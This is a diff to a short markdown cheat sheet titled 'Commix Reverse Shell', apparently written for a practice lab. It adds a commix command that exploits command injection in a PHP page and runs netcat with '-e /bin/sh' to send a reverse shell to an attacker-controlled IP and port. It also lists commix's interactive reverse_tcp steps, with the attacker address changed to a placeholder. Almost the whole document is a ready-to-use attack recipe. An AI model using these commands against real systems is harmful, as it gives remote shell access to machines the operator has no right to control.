@@ -1,5 +1,13 @@
 Commix Reverse Shell
 ====================
+Technique 1
+-----------
+```bash
+commix -u 'http://10.5.21.4/commandexec/example1.php?ip=127.0.0.1' --os-cmd="/bin/nc.traditional -e /bin/sh 10.5.21.22 1234"
+```
+
+Technique 2
+-----------
 On Attacker
 -------------
 ````bash
@@ -12,7 +20,7 @@ On Victim
 os_shell
 commix(os_shell)
 reverse_tcp
-set LHOST 10.5.21.22
+set LHOST attackers.ip.address
 set LPORT 1234
 
 ---[ Reverse TCP shells ]---     
